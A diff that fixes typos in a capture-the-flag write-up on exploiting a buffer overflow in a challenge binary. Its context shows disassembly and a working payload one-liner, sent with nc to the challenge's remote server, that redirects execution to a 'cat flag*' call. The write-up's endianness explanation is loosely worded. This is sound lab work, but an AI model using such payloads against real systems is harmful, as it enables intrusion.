@@ -60,7 +60,7 @@ Let's use `cyclic` from pwntools to generate a pattern for our BO payload: The `
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak 
 ```
 
-Now lets use `gbd` to look under the hood further:
+Now lets use `gdb` to look under the hood further:
 
  
 ``` ┌──(root💀kali)-[~/CTF/GoingDeeper/challenge]
@@ -183,7 +183,7 @@ Let's use `r2` to get the address we need to point our payload to:
 0x00400b47    1 84           main
 --------------snip-------------------
  ```
-The `aaaa` command does a full analysis, `afl` lists all functions. `pdf` (Print disassembly of function) gives even more detail. Let's look deeper at `main`
+The `aaaa` command does a full analysis, `afl` lists all functions. `pdf` (print disassembly of function) gives even more detail. Let's look deeper at `main`
 
 
 [0x004007a0]> `pdf@main`
@@ -232,12 +232,12 @@ The sym.admin_panel looks interesting- let's go deeper:
 │       │   0x00400b0d      e8fefbffff     call sym.imp.printf         ; int printf(const char *format)
 │       │   0x00400b12      488d3da50a00.  lea rdi, str.cat_flag       ; 0x4015be ; "cat flag*" ; const char *string
  ```
-This section is the the juicy part.  It tells us the exact location address `0x00400b12` to point our payload.  If we can get the program to crash right here, it should execute the `cat flag*` command and output the flag file.
+This section is the juicy part.  It tells us the exact location address `0x00400b12` to point our payload.  If we can get the program to crash right here, it should execute the `cat flag*` command and output the flag file.
 
 
 
-Using our BO offset of 85 bytes and the address of our cat function, putting it in Endian format, we construct the following payload2.
-a quick note on Endian format. Take the address `0x00400b12` strip the last 3 hex numbers from it then place them in reverse order, inserting '\x' before each one:
+Using our BO offset of 85 bytes and the address of our cat command, putting it in Endian format, we construct the following payload2.
+A quick note on Endian format. Take the address `0x00400b12` strip the last 3 hex numbers from it then place them in reverse order, inserting '\x' before each one:
 
 `echo -en "1\n$(cyclic 85)\x12\x0B\x40" > payload2 `
 
@@ -266,7 +266,7 @@ Thread 1 "sp_going_deeper" received signal SIGSEGV, Segmentation fault.
 0x0000ffffe80aeed0 in ?? ()
 ```
 
-And it works! Test flag prints out.  Now to take this exploit remotely we just point it to our target like this:
+And it works! The test flag prints out.  Now to take this exploit remotely we just point it to our target like this:
 
 ` echo -en "1\n$(cyclic 85)\x12\x0B\x40" | nc 188.166.172.138 30681`
 
